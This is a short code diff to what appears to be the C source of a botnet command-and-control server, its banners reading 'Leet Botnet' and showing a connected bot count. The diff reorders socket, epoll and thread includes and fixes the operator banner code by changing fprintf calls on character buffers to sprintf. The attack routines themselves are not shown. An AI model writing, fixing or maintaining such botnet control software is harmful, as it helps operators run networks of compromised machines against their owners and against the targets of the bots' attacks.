@@ -1,15 +1,19 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <stdint.h>
-#include <unistd.h>
-#include <netdb.h>
-#include <signal.h>
-#include <sys/socket.h>
+#include <inttypes.h>
+#include <string.h>
 #include <sys/types.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <time.h>
+#include <fcntl.h>
+#include <sys/epoll.h>
+#include <errno.h>
 #include <pthread.h>
+#include <signal.h>
+#include <arpa/inet.h>
 #define MAXFDS 1000000
 
 struct clientdata_t {
@@ -121,10 +125,10 @@ int main(int argc, char **argv) {
 		char banner_bot_count [2048];
 		memset(banner_bot_count, 0, 2048);
 		
-		fprintf(ascii_banner_line1, "\x1b[36m Leet Botnet \r\n");
-		fprintf(ascii_banner_line2, "\r\n");	
-		fprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected()); 
-		fprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
+		sprintf(ascii_banner_line1, "\x1b[36m Leet Botnet \r\n");
+		sprintf(ascii_banner_line2, "\r\n");	
+		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected()); 
+		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome Leet\x1b[36m --------\x1b[37m#\r\n");
 
 	}
 	for(x=0; x != THREADS; x++) {
